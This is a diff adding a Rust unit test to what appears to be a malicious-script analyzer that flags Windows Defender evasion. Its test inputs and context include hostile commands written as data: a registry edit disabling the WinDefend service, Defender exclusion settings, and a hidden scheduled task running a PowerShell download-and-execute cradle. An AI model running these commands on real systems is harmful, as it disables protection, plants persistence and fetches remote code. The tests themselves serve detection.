@@ -3470,6 +3470,22 @@ schtasks /create /tn "Updater" /tr "powershell -w hidden \"IEX(New-Object Net.We
     }
 
     #[test]
+    fn escaped_ampersand_defender_registry_text_does_not_emit_evasion() {
+        let script = br#"echo keep ^& reg add HKLM\SYSTEM\CurrentControlSet\Services\WinDefend /v Start /t REG_DWORD /d 4 /f"#;
+        let report = analyze(script, &AnalyzeConfig::default());
+
+        assert!(
+            !report.traits.iter().any(|t| matches!(
+                t,
+                Trait::DefenderEvasion { action, target }
+                    if action == "service-start-disabled" && target == "WinDefend"
+            )),
+            "escaped ampersand echo text was misread as Defender service disablement: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn set_mppreference_exclusions_emit_defender_evasion_traits() {
         let script = br#"powershell -Command "Set-MpPreference -ExclusionPath 'C:\Users\Public' -ExclusionProcess calc.exe"
 "#;
